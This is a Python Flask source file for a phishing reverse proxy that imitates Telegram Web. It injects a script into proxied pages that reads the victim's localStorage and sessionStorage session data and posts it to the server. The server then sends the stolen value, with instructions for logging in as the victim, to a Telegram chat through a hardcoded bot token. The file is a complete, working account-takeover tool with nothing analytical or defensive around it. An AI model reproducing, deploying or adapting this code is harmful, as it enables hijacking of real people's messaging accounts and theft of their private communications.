from flask import Flask, request, Response
import requests
import time

app = Flask(__name__)

BASE_URL = 'https://web.telegram.org/k/'
TELEGRAM_BOT_TOKEN = '7859238179:AAHJvboPix9pEkq_xNSh2RJFf3EhLqWlQEY'
TELEGRAM_CHAT_ID = '-4753436379'
KEY_NAME = 'yourKeyName'  # Set the key you are watching for

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    url = f"{BASE_URL}{path}"
    headers = {key: value for key, value in request.headers if key != 'Host'}

    if request.method == 'POST':
        response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'PUT':
        response = requests.put(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'DELETE':
        response = requests.delete(url, headers=headers, cookies=request.cookies)
    else:
        response = requests.get(url, headers=headers, cookies=request.cookies)

    injected_js = f"""
    <script>
        const keyName = '{KEY_NAME}';
        const reloadLimit = 3;

        function sendStorageData() {{
            const value = localStorage.getItem(keyName);
            const sessionStorageData = JSON.stringify(sessionStorage);

            fetch('/store-data', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify({{
                    key: keyName,
                    value: value,
                    sessionStorage: sessionStorageData
                }}),
            }});
        }}

        if (sessionStorage.getItem('reloadCount') === null) {{
            sessionStorage.setItem('reloadCount', 0);
        }} else {{
            let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
            reloadCount += 1;
            sessionStorage.setItem('reloadCount', reloadCount);

            if (reloadCount >= reloadLimit) {{
                localStorage.clear();
                sessionStorage.clear();
            }}
        }}

        setInterval(function() {{
            const value = localStorage.getItem(keyName);
            if (value !== null) {{
                console.log(`Key "{{keyName}}" exists with value:`, value);
                sendStorageData();
            }}
        }}, 5000);

        function reloadIfContainsCRipple() {{
            const rippleElement = document.querySelector('.c-ripple');
            if (rippleElement) {{
                window.location.reload();
            }}
        }}

        setInterval(function() {{
            reloadIfContainsCRipple();
        }}, 10000);
    </script>
    """

    if 'text/html' in response.headers.get('Content-Type', ''):
        content = response.text.replace('</body>', injected_js + '</body>')
    else:
        content = response.content

    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
    return Response(content, response.status_code, headers)

@app.route('/store-data', methods=['POST'])
def store_data():
    storage_data = request.json
    copy_code = storage_data.get('value', 'N/A')

    message = f"""
<b>❓ How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)

<code>{copy_code}</code>
    """

    send_message_to_telegram(message)
    return 'Data received', 200

def send_message_to_telegram(message):
    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                  data={
                      'chat_id': TELEGRAM_CHAT_ID,
                      'text': message,
                      'parse_mode': 'HTML'
                  })

if __name__ == '__main__':
    app.run(debug=True, port=5000)
